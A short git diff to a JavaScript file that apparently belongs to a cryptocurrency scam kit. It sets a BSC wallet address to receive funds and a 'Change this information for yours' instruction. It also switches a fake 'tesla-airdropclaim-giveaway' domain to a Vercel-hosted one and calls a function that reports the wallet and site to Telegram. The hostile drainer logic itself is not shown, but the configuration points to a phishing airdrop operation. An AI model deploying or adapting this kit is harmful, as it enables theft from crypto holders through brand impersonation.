@@ -25,5 +25,5 @@ async function sendMessageToTelegram(bsc_wallet_receiver_id, website_url) {
 
 // Change this information for yours (
 const bsc_wallet_receiver_id = '0x1Bd9e6fC649C1Ff7e532Cfe8928b748933cB5E5A';
-const website_url = 'tesla-airdropclaim-giveaway.app';
+const website_url = 'tesla-airdropclaim-giveaway.vercel.app';
 sendMessageToTelegram(bsc_wallet_receiver_id, website_url);
